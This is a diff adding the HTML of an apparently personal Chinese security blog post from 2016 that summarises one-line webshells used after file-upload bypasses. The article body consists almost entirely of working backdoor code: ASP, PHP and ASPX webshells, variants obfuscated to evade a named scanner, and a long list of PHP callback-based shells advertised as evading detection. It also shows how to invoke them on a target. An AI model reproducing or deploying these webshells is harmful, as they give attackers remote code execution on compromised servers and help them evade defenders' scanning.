@@ -1,0 +1,333 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件上传总结【三】 | xiaofeng&#39;s Blog</title>
+  <meta name="author" content="xiaofeng">
+  
+  <meta name="description" content="这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。asp一句话&amp;lt;% execute(request(&amp;quot;1&amp;quot;)) %&amp;gt; 
+php一句话&amp;lt;?php eval($_POST[1]); ?&amp;gt; 
+aspx一句话&amp;lt;script language=&amp;quot;C#&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt; 
+WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(&amp;quot;add6bb58e139be10&amp;quot;); 
+&amp;lt;/script&amp;gt; 
+可以躲过雷客图的asp一句话&amp;lt;% 
+set ms = server.CreateObject(&amp;quot;MSScriptControl.ScriptControl.1&amp;quot;) 
+ms.Language=&amp;quot;VBScript&amp;quot; 
+ms.AddObject &amp;quot;Response&amp;quot;, Response 
+ms.AddObject &amp;quot;request&amp;quot;, request
+ms.ExecuteStatement(&amp;quot;ev&amp;quot;&amp;amp;&amp;quot;al(request(&amp;quot;&amp;quot;1&amp;quot;&amp;quot;))&amp;quot;) 
+%&amp;gt; 
+不用’&amp;lt;,&amp;gt;’的asp一句话&amp;lt;script language=VBScript runat=server&amp;gt;execute request(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="文件上传总结【三】"/>
+  <meta property="og:site_name" content="xiaofeng&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="xiaofeng&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+<a href="https://github.com/xiaofengtongxue/xiaofengtongxue.github.io.git" target="_blank">
+<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub">
+</a>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">xiaofeng&#39;s Blog</a></h1>
+  <h2><a href="/">一个不抽烟 不喝酒的少年</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="//about">About</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-27T00:36:04.000Z"><a href="/2016/07/27/21/">2016-07-27</a></time>
+      
+      
+  
+    <h1 class="title">文件上传总结【三】</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h4 id="这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。"><a href="#这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。" class="headerlink" title="这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。"></a>这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。</h4><h4 id="asp一句话"><a href="#asp一句话" class="headerlink" title="asp一句话"></a>asp一句话</h4><pre><code>&lt;% execute(request(&quot;1&quot;)) %&gt; 
+</code></pre><h4 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h4><pre><code>&lt;?php eval($_POST[1]); ?&gt; 
+</code></pre><h4 id="aspx一句话"><a href="#aspx一句话" class="headerlink" title="aspx一句话"></a>aspx一句话</h4><pre><code>&lt;script language=&quot;C#&quot; runat=&quot;server&quot;&gt; 
+WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;); 
+&lt;/script&gt; 
+</code></pre><h3 id="可以躲过雷客图的asp一句话"><a href="#可以躲过雷客图的asp一句话" class="headerlink" title="可以躲过雷客图的asp一句话"></a>可以躲过雷客图的asp一句话</h3><pre><code>&lt;% 
+set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;) 
+ms.Language=&quot;VBScript&quot; 
+ms.AddObject &quot;Response&quot;, Response 
+ms.AddObject &quot;request&quot;, request
+ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;1&quot;&quot;))&quot;) 
+%&gt; 
+</code></pre><h3 id="不用’-lt-gt-’的asp一句话"><a href="#不用’-lt-gt-’的asp一句话" class="headerlink" title="不用’&lt;,&gt;’的asp一句话"></a>不用’&lt;,&gt;’的asp一句话</h3><pre><code>&lt;script language=VBScript runat=server&gt;execute request(&quot;1&quot;)&lt;/script&gt; 
+</code></pre><a id="more"></a> 
+<h3 id="不用双引号的一句话。"><a href="#不用双引号的一句话。" class="headerlink" title="不用双引号的一句话。"></a>不用双引号的一句话。</h3><pre><code>&lt;% eval request(chr(35))%&gt;
+&lt;% $q=base64_decode;$z=$q(cmVxdWVzdA==);execute $z(&apos;sec&apos;);%&gt;
+</code></pre><h2 id="不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5-4-8-、或sqlite-pdo-yaml-memcached扩展等）"><a href="#不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5-4-8-、或sqlite-pdo-yaml-memcached扩展等）" class="headerlink" title="不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5.4.8+、或sqlite/pdo/yaml/memcached扩展等）"></a>不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5.4.8+、或sqlite/pdo/yaml/memcached扩展等）</h2><h3 id="所有一句话使用方法基本都是："><a href="#所有一句话使用方法基本都是：" class="headerlink" title="所有一句话使用方法基本都是："></a>所有一句话使用方法基本都是：</h3><pre><code>http:// target/shell.php?e=assert 密码pass
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;],);
+array_filter($arr, $e);
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;],);
+array_map($e, $arr);
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]);
+uasort($arr, $e);
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(&apos;test&apos; =&gt; 1, $_REQUEST[&apos;pass&apos;] =&gt; 2);
+uksort($arr, $e);
+
+
+$arr = new ArrayObject(array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]));
+$arr-&gt;uasort(&apos;assert&apos;);
+
+
+$arr = new ArrayObject(array(&apos;test&apos; =&gt; 1, $_REQUEST[&apos;pass&apos;] =&gt; 2));
+$arr-&gt;uksort(&apos;assert&apos;);
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array(1);
+array_reduce($arr, $e, $_POST[&apos;pass&apos;]);
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;]);
+$arr2 = array(1);
+array_udiff($arr, $arr2, $e);
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;] =&gt; &apos;|.*|e&apos;,);
+array_walk($arr, $e, &apos;&apos;);
+
+
+$e = $_REQUEST[&apos;e&apos;];
+$arr = array($_POST[&apos;pass&apos;] =&gt; &apos;|.*|e&apos;,);
+array_walk_recursive($arr, $e, &apos;&apos;);
+
+mb_ereg_replace(&apos;.*&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;, &apos;e&apos;);
+
+echo preg_filter(&apos;|.*|e&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;);
+
+ob_start(&apos;assert&apos;);
+echo $_REQUEST[&apos;pass&apos;];
+ob_end_flush();
+
+$e = $_REQUEST[&apos;e&apos;];
+register_shutdown_function($e, $_REQUEST[&apos;pass&apos;]);
+
+$e = $_REQUEST[&apos;e&apos;];
+declare(ticks=1);
+register_tick_function($e, $_REQUEST[&apos;pass&apos;]);
+
+filter_var($_REQUEST[&apos;pass&apos;], FILTER_CALLBACK, array(&apos;options&apos; =&gt; &apos;assert&apos;));
+
+filter_var_array(array(&apos;test&apos; =&gt; $_REQUEST[&apos;pass&apos;]), array(&apos;test&apos; =&gt; array(&apos;filter&apos; =&gt; FILTER_CALLBACK, &apos;options&apos; =&gt; &apos;assert&apos;)));
+
+$e = $_REQUEST[&apos;e&apos;];
+$db = new PDO(&apos;sqlite:sqlite.db3&apos;);
+$db-&gt;sqliteCreateFunction(&apos;myfunc&apos;, $e, 1);
+$sth = $db-&gt;prepare(&quot;SELECT myfunc(:exec)&quot;);
+$sth-&gt;execute(array(&apos;:exec&apos; =&gt; $_REQUEST[&apos;pass&apos;]));
+
+$e = $_REQUEST[&apos;e&apos;];
+$db = new SQLite3(&apos;sqlite.db3&apos;);
+$db-&gt;createFunction(&apos;myfunc&apos;, $e);
+$stmt = $db-&gt;prepare(&quot;SELECT myfunc(?)&quot;);
+$stmt-&gt;bindValue(1, $_REQUEST[&apos;pass&apos;], SQLITE3_TEXT);
+$stmt-&gt;execute();
+
+$str = urlencode($_REQUEST[&apos;pass&apos;]);
+$yaml = &lt;&lt;&lt;EOD
+greeting: !{$str} &quot;|.+|e&quot;
+EOD;
+$parsed = yaml_parse($yaml, 0, $cnt, array(&quot;!{$_REQUEST[&apos;pass&apos;]}&quot; =&gt; &apos;preg_replace&apos;));
+
+
+$mem = new Memcache();
+$re = $mem-&gt;addServer(&apos;localhost&apos;, 11211, TRUE, 100, 0, -1, TRUE, create_function(&apos;$a,$b,$c,$d,$e&apos;, &apos;return assert($a);&apos;));
+$mem-&gt;connect($_REQUEST[&apos;pass&apos;], 11211, 0);
+
+preg_replace_callback(&apos;/.+/i&apos;, create_function(&apos;$arr&apos;, &apos;return assert($arr[0]);&apos;), $_REQUEST[&apos;pass&apos;]);
+
+mb_ereg_replace_callback(&apos;.+&apos;, create_function(&apos;$arr&apos;, &apos;return assert($arr[0]);&apos;), $_REQUEST[&apos;pass&apos;]);
+
+
+$iterator = new CallbackFilterIterator(new      ArrayIterator(array($_REQUEST[&apos;pass&apos;],)), create_function(&apos;$a&apos;, &apos;assert($a);&apos;));
+foreach ($iterator as $item) {echo $item;}
+</code></pre><h3 id="默默的不说话，留着自己用方便"><a href="#默默的不说话，留着自己用方便" class="headerlink" title="默默的不说话，留着自己用方便 -^-"></a>默默的不说话，留着自己用方便 -^-</h3>
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/php/">php</a>
+  </div>
+
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
+    <a href="#" class="bds_renren" data-cmd="renren"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
+</div>
+
+<script>
+    window._bd_share_config = {
+        "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdPic": "",
+            "bdStyle": "0",
+            "bdSize": "16"
+        },
+        "share": {},
+        "image": {
+            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
+            "viewText": “分享到",
+            "viewSize": "16"
+        },
+        "selectShare": {
+            "bdContainerClass": null,
+            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
+        }
+    };
+    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/27/21/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <SCRIPT language=javascript>
+function search(formname) {
+    formname.method = "get";
+    formname.action = "http://www.baidu.com/baidu";
+    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
+    return true;
+}
+</SCRIPT>
+
+<div class="search">
+    <form name="search_form" target="_blank" onsubmit="search(this)">
+        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
+        <!-- <input type="submit" value="搜索"> -->
+    </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Linux基础/">Linux基础</a><small>3</small></li>
+  
+    <li><a href="/tags/php/">php</a><small>5</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>4</small></li>
+  
+    <li><a href="/tags/渗透学习/">渗透学习</a><small>7</small></li>
+  
+    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
+  
+    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 xiaofeng
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
